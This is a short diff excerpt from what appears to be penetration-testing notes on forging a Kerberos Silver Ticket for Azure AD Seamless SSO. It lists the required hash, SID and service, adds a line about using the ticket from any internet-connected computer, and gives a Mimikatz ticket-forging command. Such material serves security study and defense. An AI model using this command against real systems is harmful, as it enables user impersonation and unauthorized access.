@@ -27,6 +27,8 @@ Domain name.
 NTLM hash of the AZUREADSSOACC$ account.
 SID of the user to impersonate.
 Target service, which is HTTP/aadg.windows.net.nsatc.net.
+
+'Having this information we can now create and use the Silver Ticket on any Windows computer connected to the internet'
 ```
 kerberos::golden /user:NyaMeeEain /domain:insomnia.com /rc4:db[...]59 /sid:S-1-5-21-805388781-1469664503-1626361301-1106 /id:1234 /target:XXXXXXX.net /service:HTTP /ptt
 ```
